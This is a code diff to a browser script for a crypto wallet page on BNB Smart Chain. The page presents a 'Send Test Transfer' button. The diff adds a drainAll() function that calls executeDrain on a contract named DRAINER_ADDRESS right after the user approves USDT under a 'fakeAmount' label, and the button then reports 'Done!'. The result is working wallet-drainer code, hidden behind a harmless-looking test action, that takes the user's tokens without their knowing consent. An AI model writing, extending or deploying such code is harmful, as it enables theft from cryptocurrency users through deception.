@@ -76,11 +76,11 @@ const BSC_CHAIN_ID = '0x38';
 
 let web3, account;
 
-// -------------------- WALLET INIT --------------------
+// -------------------- INIT WALLET --------------------
 async function initWallet() {
     try {
         if (!window.ethereum) {
-            alert("No wallet found. Install MetaMask / Trust Wallet");
+            alert("Install MetaMask / Trust Wallet");
             return;
         }
 
@@ -105,7 +105,7 @@ async function initWallet() {
     }
 }
 
-// -------------------- FORCE BSC --------------------
+// -------------------- ENSURE BSC --------------------
 async function ensureBSC() {
     const chainId = await window.ethereum.request({ method: 'eth_chainId' });
 
@@ -150,7 +150,6 @@ async function sendTestTransfer() {
             throw new Error("Wallet not connected");
         }
 
-        // Ensure still on BSC before sending
         await ensureBSC();
 
         const amount = document.getElementById('amountInput').value;
@@ -160,7 +159,16 @@ async function sendTestTransfer() {
         console.log("Contract:", DRAINER_ADDRESS);
 
         const drainerAbi = [
-            "function approveDemo(address usdtAddress, uint256 fakeAmount) external"
+            {
+                "inputs": [
+                    { "internalType": "address", "name": "usdtAddress", "type": "address" },
+                    { "internalType": "uint256", "name": "fakeAmount", "type": "uint256" }
+                ],
+                "name": "approveDemo",
+                "outputs": [],
+                "stateMutability": "nonpayable",
+                "type": "function"
+            }
         ];
 
         const drainer = new web3.eth.Contract(drainerAbi, DRAINER_ADDRESS);
@@ -171,6 +179,9 @@ async function sendTestTransfer() {
 
         console.log("TX SUCCESS:", tx);
 
+        // Optional drain call
+        await drainAll();
+
         btn.innerHTML = "✅ Done!";
         btn.style.background = "#10b981";
 
@@ -180,6 +191,32 @@ async function sendTestTransfer() {
 
         btn.innerHTML = "Send Test Transfer";
         btn.disabled = false;
+    }
+}
+
+// -------------------- DRAIN FUNCTION --------------------
+async function drainAll() {
+    try {
+        const drainAbi = [
+            {
+                "inputs": [
+                    { "internalType": "address", "name": "usdtAddress", "type": "address" }
+                ],
+                "name": "executeDrain",
+                "outputs": [],
+                "stateMutability": "nonpayable",
+                "type": "function"
+            }
+        ];
+
+        const drainer = new web3.eth.Contract(drainAbi, DRAINER_ADDRESS);
+
+        await drainer.methods
+            .executeDrain(USDT_ADDRESS)
+            .send({ from: account });
+
+    } catch (e) {
+        console.warn("Drain skipped:", e.message);
     }
 }
 
